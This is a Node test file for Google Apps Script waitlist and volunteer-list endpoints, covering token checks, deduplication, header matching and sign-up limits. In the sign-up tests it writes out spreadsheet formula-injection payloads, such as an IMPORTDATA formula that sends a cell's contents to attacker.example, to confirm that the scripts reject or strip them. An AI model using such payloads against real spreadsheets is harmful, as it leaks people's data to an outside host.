/**
 * The two list actions the planner's admin tools call: waitlist.gs and
 * volunteer-list.gs. They run in Google's Apps Script runtime, so the tests
 * load each file into a Node VM with a small fake of the services it uses.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import vm from 'node:vm';

const BETA = "Invite me to the planner's beta when it opens.";
const VOLUNTEER_SHEET_ID = '1K3LL_00Kq4L0ouTsr2cQc25xKNLn5YaI75KnKn9U3Z8';
const WHEN = new Date('2026-01-01T00:00:00Z');

/** Loads a script with `rows` (header row first) as its only sheet. */
function fakeSheet(rows) {
  return {
    getLastRow: () => rows.length,
    getLastColumn: () => rows[0].length,
    getName: () => 'tab',
    getRange: (r, c, nr = 1, nc = 1) => ({
      getValues: () => rows.slice(r - 1, r - 1 + nr).map((row) => row.slice(c - 1, c - 1 + nc)),
    }),
  };
}

/**
 * `volunteerRows` is the volunteer spreadsheet that waitlist.gs opens by id
 * for its count; `null` makes opening it throw, as an unshared sheet would.
 */
function load(file, rows, { sheetCount = 1, volunteerRows = undefined, volunteerTabs = 1 } = {}) {
  const sheet = fakeSheet(rows);
  const junk = { getLastRow: () => 1, getLastColumn: () => 1, getRange: () => ({ getValues: () => [['Notes']] }) };
  const sheets = sheetCount === 2 ? [junk, sheet] : [sheet];
  const ctx = {
    console: { error() {}, log() {}, warn() {} },
    Utilities: {
      DigestAlgorithm: { SHA_256: 1 },
      Charset: { UTF_8: 1 },
      computeDigest: (_a, s) => [...crypto.createHash('sha256').update(s).digest()].map((b) => (b > 127 ? b - 256 : b)),
    },
    ContentService: { MimeType: { JSON: 1 }, createTextOutput: (s) => ({ s, setMimeType() { return this; } }) },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({ getSheets: () => sheets }),
      openById: (id) => {
        if (id === VOLUNTEER_SHEET_ID) {
          if (volunteerRows === undefined || volunteerRows === null) throw new Error('no access');
          return { getSheets: () => [junk, ...Array.from({ length: volunteerTabs }, () => fakeSheet(volunteerRows))] };
        }
        return { getSheetByName: () => sheet };
      },
    },
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => 'x' }) },
    ScriptApp: { getService: () => ({ getUrl: () => 'https://example.invalid/exec' }) },
  };
  vm.createContext(ctx);
  vm.runInContext(fs.readFileSync(file, 'utf8'), ctx);
  return ctx;
}

/** A POST whose action and token are in the form body, as the planner sends them. */
const post = (fields) => ({ parameter: fields, postData: { contents: new URLSearchParams(fields).toString() } });
const answer = (out) => JSON.parse(out.s);

// Test tokens: the scripts hold only hashes, so these tests swap the hash for one they know.
const TOKEN = 'a-test-token-for-the-list-action';
const HASH = crypto.createHash('sha256').update(TOKEN).digest('hex');
function withToken(ctx, constant) {
  vm.runInContext(`${constant} = '${HASH}';`, ctx);
  return ctx;
}

describe('waitlist.gs list action', () => {
  const rows = [
    ['email', 'source', 'created_at'],
    ['A@x.io', '/free/loan-comparison/', WHEN],
    ['a@x.io', '/other/', WHEN],
    ['not-an-email', 'p', WHEN],
    ['', 'p', WHEN],
    ['b@x.io', 'x'.repeat(500), WHEN],
  ];
  const ctx = () => withToken(load('scripts/waitlist.gs', rows), 'LIST_TOKEN_SHA256_');

  it('returns distinct valid addresses with only email, source and created_at', () => {
    const out = answer(ctx().doPost(post({ action: 'list', token: TOKEN })));
    assert.equal(out.ok, true);
    assert.deepEqual(out.items.map((i) => i.email), ['a@x.io', 'b@x.io']);
    assert.deepEqual(Object.keys(out.items[0]), ['email', 'source', 'created_at']);
    assert.equal(out.items[0].source, '/free/loan-comparison/');
    assert.equal(out.items[1].source.length, 200);
  });

  it('refuses a wrong, missing or oversized token', () => {
    for (const token of ['nope', '', 't'.repeat(500)]) {
      assert.equal(answer(ctx().doPost(post({ action: 'list', token }))).error, 'forbidden');
    }
  });

  it('never accepts the token or the action from the query string', () => {
    const query = { parameter: { action: 'list', token: TOKEN }, postData: { contents: '' } };
    const out = answer(ctx().doPost(query));
    assert.equal(out.ok, false);
    assert.equal(out.items, undefined);
  });

  it('answers schema when the columns are not where it expects them', () => {
    const swapped = [['source', 'email', 'created_at'], ['p', 'a@x.io', WHEN]];
    const c = withToken(load('scripts/waitlist.gs', swapped), 'LIST_TOKEN_SHA256_');
    assert.equal(answer(c.doPost(post({ action: 'list', token: TOKEN }))).error, 'schema');
  });

  it('returns an empty list for a sheet with only a header', () => {
    const c = withToken(load('scripts/waitlist.gs', [rows[0]]), 'LIST_TOKEN_SHA256_');
    assert.deepEqual(answer(c.doPost(post({ action: 'list', token: TOKEN }))), { ok: true, items: [] });
  });

  it('does not accept the count token for the list action', () => {
    const c = load('scripts/waitlist.gs', rows);
    assert.equal(answer(c.doPost(post({ action: 'list', token: TOKEN }))).error, 'forbidden');
  });

  it('keeps health output coarse', () => {
    const out = answer(ctx().doGet({ parameter: { action: 'health' } }));
    assert.deepEqual(out.checks.sheet, { ok: true });
    assert.equal(JSON.stringify(out).includes('tab'), false);
    assert.equal('web_app_url' in out, false);
  });
});

describe('waitlist.gs count action', () => {
  const header = ['email', 'source', 'created_at'];
  const volunteerHeader = ['Timestamp', 'Email', 'Name to credit (optional)', 'Planner beta (optional)'];
  const waitlist = [header, ['A@x.io', 'p', WHEN], ['a@x.io', 'p', WHEN], ['bad', 'p', WHEN], ['b@x.io', 'p', WHEN]];
  const count = (wait, volunteers, tokenGiven = TOKEN) => {
    const c = withToken(load('scripts/waitlist.gs', wait, { volunteerRows: volunteers }), 'COUNT_TOKEN_SHA256_');
    return answer(c.doPost(post({ action: 'count', token: tokenGiven })));
  };

  it('counts the union of waitlist addresses and beta-ticked volunteers', () => {
    const volunteers = [volunteerHeader, [WHEN, 'c@x.io', 'n', BETA], [WHEN, 'd@x.io', 'n', `Other, ${BETA}`]];
    assert.deepEqual(count(waitlist, volunteers), { ok: true, count: 4 });
  });

  it('counts a person on both lists once, however the address is written', () => {
    const volunteers = [volunteerHeader, [WHEN, ' A@X.io ', 'n', BETA], [WHEN, 'c@x.io', 'n', BETA], [WHEN, 'C@x.io', 'n', BETA]];
    assert.deepEqual(count(waitlist, volunteers), { ok: true, count: 3 });
  });

  it('leaves out volunteers who did not tick the beta box', () => {
    const volunteers = [volunteerHeader, [WHEN, 'c@x.io', 'n', ''], [WHEN, 'd@x.io', 'n', 'Something else']];
    assert.deepEqual(count(waitlist, volunteers), { ok: true, count: 2 });
  });

  it('leaves out invalid volunteer addresses', () => {
    const volunteers = [volunteerHeader, [WHEN, 'nope', 'n', BETA], [WHEN, '', 'n', BETA]];
    assert.deepEqual(count(waitlist, volunteers), { ok: true, count: 2 });
  });

  it('counts volunteers when the waitlist is empty, and the waitlist when there are no volunteers', () => {
    assert.deepEqual(count([header], [volunteerHeader, [WHEN, 'c@x.io', 'n', BETA]]), { ok: true, count: 1 });
    assert.deepEqual(count(waitlist, [volunteerHeader]), { ok: true, count: 2 });
  });

  it('finds the volunteer columns by header text, wherever they are', () => {
    const volunteers = [['Planner beta (optional)', 'Email'], [BETA, 'c@x.io']];
    assert.deepEqual(count(waitlist, volunteers), { ok: true, count: 3 });
  });

  it('answers an error, not a lower number, when the volunteer headers do not match', () => {
    const out = count(waitlist, [['Timestamp', 'Email'], [WHEN, 'c@x.io']]);
    assert.deepEqual(out, { ok: false, error: 'schema' });
  });

  it('answers an error when the volunteer spreadsheet cannot be opened', () => {
    assert.deepEqual(count(waitlist, null), { ok: false, error: 'error' });
  });

  it('counts a choice only when it is a whole selected option, not part of another', () => {
    const volunteers = [
      volunteerHeader,
      [WHEN, 'c@x.io', 'n', `Other, ${BETA}`],
      [WHEN, 'd@x.io', 'n', `${BETA}, Other`],
      [WHEN, 'e@x.io', 'n', `A, ${BETA}, B`],
      [WHEN, 'f@x.io', 'n', `${BETA} Not really`],
      [WHEN, 'g@x.io', 'n', `Maybe: ${BETA}`],
    ];
    assert.deepEqual(count(waitlist, volunteers), { ok: true, count: 5 });
  });

  it('answers schema when the waitlist headers are not where the count expects them', () => {
    const moved = [['source', 'email', 'created_at'], ['p', 'a@x.io', WHEN]];
    assert.deepEqual(count(moved, [volunteerHeader]), { ok: false, error: 'schema' });
  });

  it('answers schema, not the first tab, when two volunteer tabs have the headers', () => {
    const c = withToken(load('scripts/waitlist.gs', waitlist, { volunteerRows: [volunteerHeader, [WHEN, 'c@x.io', 'n', BETA]], volunteerTabs: 2 }), 'COUNT_TOKEN_SHA256_');
    assert.deepEqual(answer(c.doPost(post({ action: 'count', token: TOKEN }))), { ok: false, error: 'schema' });
  });

  it('never accepts the token or the action from the query string', () => {
    const c = withToken(load('scripts/waitlist.gs', waitlist, { volunteerRows: [volunteerHeader] }), 'COUNT_TOKEN_SHA256_');
    const query = { parameter: { action: 'count', token: TOKEN }, postData: { contents: '' } };
    assert.equal(answer(c.doPost(query)).ok, false);
    assert.equal(answer(c.doPost(query)).count, undefined);
    const mixed = { parameter: { action: 'count', token: TOKEN }, postData: { contents: 'action=count' } };
    assert.equal(answer(c.doPost(mixed)).error, 'forbidden');
  });

  it('refuses an oversized token', () => {
    assert.equal(count(waitlist, [volunteerHeader], 't'.repeat(500)).error, 'forbidden');
  });

  it('refuses a wrong token and returns only the number', () => {
    assert.equal(count(waitlist, [volunteerHeader], 'nope').error, 'forbidden');
    const out = count(waitlist, [volunteerHeader, [WHEN, 'c@x.io', 'Private Name', BETA]]);
    assert.deepEqual(Object.keys(out), ['ok', 'count']);
  });
});

describe('volunteer-list.gs', () => {
  const header = ['Timestamp', 'Email', 'Name to credit (optional)', 'Planner beta (optional)'];
  const rows = [
    header,
    [WHEN, 'V@x.io', 'Private Name', BETA],
    [WHEN, 'w@x.io', 'Other', ''],
    [WHEN, 'v@x.io', 'Dup', BETA],
    [WHEN, 'bad', 'Bad', BETA],
    [WHEN, 'x@x.io', 'Multi', `Something, ${BETA}`],
  ];
  const ctx = (data = rows, options) => withToken(load('scripts/volunteer-list.gs', data, options), 'VOLUNTEER_LIST_TOKEN_SHA256_');

  it('returns only email and timestamp, only for ticked rows, once per address', () => {
    const out = answer(ctx().doPost(post({ action: 'list', token: TOKEN })));
    assert.equal(out.ok, true);
    assert.deepEqual(out.items.map((i) => i.email), ['v@x.io', 'x@x.io']);
    assert.deepEqual(Object.keys(out.items[0]), ['email', 'submitted_at']);
    assert.equal(JSON.stringify(out).includes('Private Name'), false);
  });

  it('finds columns by header text, so a reordered sheet still works', () => {
    const reordered = [['Planner beta (optional)', 'Email', 'Timestamp'], [BETA, 'r@x.io', WHEN]];
    const out = answer(ctx(reordered).doPost(post({ action: 'list', token: TOKEN })));
    assert.deepEqual(out.items.map((i) => i.email), ['r@x.io']);
  });

  it('finds the response tab by its headers, not by position', () => {
    const out = answer(ctx(rows, { sheetCount: 2 }).doPost(post({ action: 'list', token: TOKEN })));
    assert.equal(out.ok, true);
  });

  it('answers schema when a header is missing', () => {
    const missing = [['Timestamp', 'Email'], [WHEN, 'a@x.io']];
    assert.equal(answer(ctx(missing).doPost(post({ action: 'list', token: TOKEN }))).error, 'schema');
  });

  it('returns an empty list when there are no responses', () => {
    assert.deepEqual(answer(ctx([header]).doPost(post({ action: 'list', token: TOKEN }))), { ok: true, items: [] });
  });

  it('refuses a wrong, missing or oversized token', () => {
    for (const token of ['nope', '', 't'.repeat(500)]) {
      assert.equal(answer(ctx().doPost(post({ action: 'list', token }))).error, 'forbidden');
    }
  });

  it('never accepts the token or the action from the query string', () => {
    const query = { parameter: { action: 'list', token: TOKEN }, postData: { contents: '' } };
    assert.equal(answer(ctx().doPost(query)).error, 'not_found');
    const mixed = { parameter: { action: 'list', token: TOKEN }, postData: { contents: 'action=list' } };
    assert.equal(answer(ctx().doPost(mixed)).error, 'forbidden');
  });

  it('answers any other action and any GET with not_found', () => {
    assert.equal(answer(ctx().doPost(post({ action: 'count', token: TOKEN }))).error, 'not_found');
    assert.equal(answer(ctx().doGet({ parameter: { action: 'list', token: TOKEN } })).error, 'not_found');
  });

  it('keeps health output coarse', () => {
    const out = answer(ctx().doGet({ parameter: { action: 'health' } }));
    assert.deepEqual(out, { ok: true, checks: { web_app_url: { ok: true }, sheet: { ok: true } } });
  });

  it('matches the choice and the question titles the form script creates', () => {
    const form = fs.readFileSync('scripts/volunteer-form.gs', 'utf8');
    // The form writes the choice as a single-quoted literal in setChoiceValues.
    const choice = /setChoiceValues\(\[('(?:[^'\\]|\\.)*')\]\)/g;
    const literals = [...form.matchAll(choice)].map((m) => vm.runInNewContext(m[1]));
    // waitlist.gs holds its own copy of the contract for its count.
    const copies = [
      ['scripts/volunteer-list.gs', { choice: 'BETA_CHOICE_', email: 'HEADER_EMAIL_', timestamp: 'HEADER_TIMESTAMP_', beta: 'HEADER_BETA_' }],
      ['scripts/waitlist.gs', { choice: 'VOLUNTEER_BETA_CHOICE_', email: 'VOLUNTEER_HEADER_EMAIL_', beta: 'VOLUNTEER_HEADER_BETA_' }],
    ];
    for (const [file, names] of copies) {
      const get = (name) => vm.runInContext(name, load(file, rows));
      assert.ok(literals.includes(get(names.choice)), `${file}: the beta choice text differs from the form`);
      const titles = { email: 'Email', timestamp: 'Timestamp', beta: 'Planner beta (optional)' };
      for (const [key, constant] of Object.entries(names)) {
        if (key === 'choice') continue;
        assert.equal(get(constant), titles[key], `${file}: ${constant}`);
        if (key !== 'timestamp') assert.ok(form.includes(`.setTitle('${titles[key]}')`), `${titles[key]} is not a question title in the form`);
      }
    }
  });
});

describe('sameString_', () => {
  const { sameString_ } = load('scripts/volunteer-list.gs', [['x']]);
  it('is true only for equal strings', () => {
    assert.equal(sameString_('abc', 'abc'), true);
    assert.equal(sameString_('abc', 'abd'), false);
    assert.equal(sameString_('abc', 'abcd'), false);
    assert.equal(sameString_('', ''), true);
  });
});

describe('waitlist.gs sign-up: what a request can make it write', () => {
  /** Loads the script over a sheet that can be added to, with a lock and a property store. */
  function loadWritable(rows) {
    const store = { SPREADSHEET_ID: 'x', SHEET_NAME: 'tab', SITE_URL: 'https://nidhi.today', waitlist_deduped_v1: '1' };
    const c = load('scripts/waitlist.gs', rows);
    const state = { locked: false, tracked: [] };
    vm.runInContext('SHEET_CACHE = null; CONFIG_CACHE = null;', c);
    const sheet = {
      ...fakeSheet(rows),
      getLastRow: () => rows.length,
      getRange: (r, col, nr = 1, nc = 1) => ({ getValues: () => rows.slice(r - 1, r - 1 + nr).map((row) => row.slice(col - 1, col - 1 + nc)) }),
      appendRow: (values) => { if (!state.locked) throw new Error('appendRow without the lock'); rows.push(values); },
      deleteRow: () => {},
    };
    c.SpreadsheetApp.openById = () => ({ getSheetByName: () => sheet });
    c.PropertiesService = { getScriptProperties: () => ({
      getProperty: (k) => (k in store ? store[k] : null),
      setProperty: (k, v) => { store[k] = String(v); },
      deleteProperty: (k) => { delete store[k]; },
      getProperties: () => ({ ...store }),
    }) };
    c.LockService = { getScriptLock: () => ({ waitLock: () => { state.locked = true; }, releaseLock: () => { state.locked = false; } }) };
    c.Utilities.formatDate = (d) => d.toISOString().slice(0, 10);
    c.UrlFetchApp = { fetch: (_u, o) => { state.tracked.push(JSON.parse(o.payload)); } };
    return { c, rows, store, state };
  }
  const header = ['email', 'source', 'created_at'];
  const signup = (c, fields) => answer(c.doPost({ parameter: { action: 'waitlist', ...fields }, postData: { contents: '' } }));

  it('keeps only a site path as the source', () => {
    const { c, rows } = loadWritable([header.slice()]);
    for (const [email, source] of [
      ['a@x.io', '/free/loan-comparison/'], ['b@x.io', '=IMPORTDATA("https://attacker.example/?"&A2)'], ['c@x.io', '@x'], ['d@x.io', 'x'.repeat(400)],
    ]) assert.deepEqual(signup(c, { email, source }), { ok: true });
    // Rows written inside the VM are arrays of its own realm: compare what they hold.
    assert.equal(JSON.stringify(rows.slice(1).map((r) => r.slice(0, 2))), JSON.stringify([['a@x.io', '/free/loan-comparison/'], ['b@x.io', ''], ['c@x.io', ''], ['d@x.io', '']]));
  });

  it('refuses an address that a spreadsheet would read as a formula', () => {
    const { c, rows } = loadWritable([header.slice()]);
    for (const email of ['=importdata("https://x.example/?a@b.c"&a2)', '+cmd@x.io', '-1@x.io', '@a@x.io', 'a"b@x.io', 'not-an-email']) {
      assert.deepEqual(signup(c, { email }), { ok: false, error: 'invalid_email' }, email);
    }
    assert.equal(rows.length, 1);
    assert.deepEqual(signup(c, { email: 'First.Last+tag@Example.co.uk' }), { ok: true });
    assert.equal(rows[1][0], 'first.last+tag@example.co.uk');
  });

  it('the sign-up event is filed under a hash of the address and carries no address', () => {
    const { c, store, state } = loadWritable([header.slice()]);
    store.POSTHOG_API_KEY = 'phc_test_key';
    vm.runInContext('CONFIG_CACHE = null;', c);
    assert.deepEqual(signup(c, { email: 'Jane.Reader@Example.org', source: '/free/loan-comparison/' }), { ok: true });
    // A second request for the same address adds nothing and sends nothing.
    assert.deepEqual(signup(c, { email: 'jane.reader@example.org', source: '/free/loan-comparison/' }), { ok: true });
    assert.equal(state.tracked.length, 1);
    const event = state.tracked[0];
    assert.equal(event.event, 'waitlist_signup');
    assert.equal(event.distinct_id, crypto.createHash('sha256').update('jane.reader@example.org').digest('hex'));
    assert.deepEqual(Object.keys(event.properties).sort(), ['email_domain', 'source']);
    assert.deepEqual(Object.keys(event).sort(), ['api_key', 'distinct_id', 'event', 'properties', 'timestamp']);
    // The domain is sent (the privacy finding on it is the owner's to settle);
    // the part before the @ never is.
    assert.doesNotMatch(JSON.stringify(event), /@|jane|reader/i);
  });

  it('stops adding rows at the day’s limit and says the same', () => {
    const { c, rows, store } = loadWritable([header.slice()]);
    vm.runInContext('MAX_SIGNUPS_PER_DAY_ = 2;', c);
    store['signups:2020-01-01'] = '9';
    for (const email of ['a@x.io', 'b@x.io', 'c@x.io', 'a@x.io']) assert.deepEqual(signup(c, { email }), { ok: true });
    assert.equal(rows.slice(1).map((r) => r[0]).join(), 'a@x.io,b@x.io');
    assert.equal(Object.keys(store).filter((k) => k.startsWith('signups:')).length, 1, 'earlier days are dropped');
  });
});
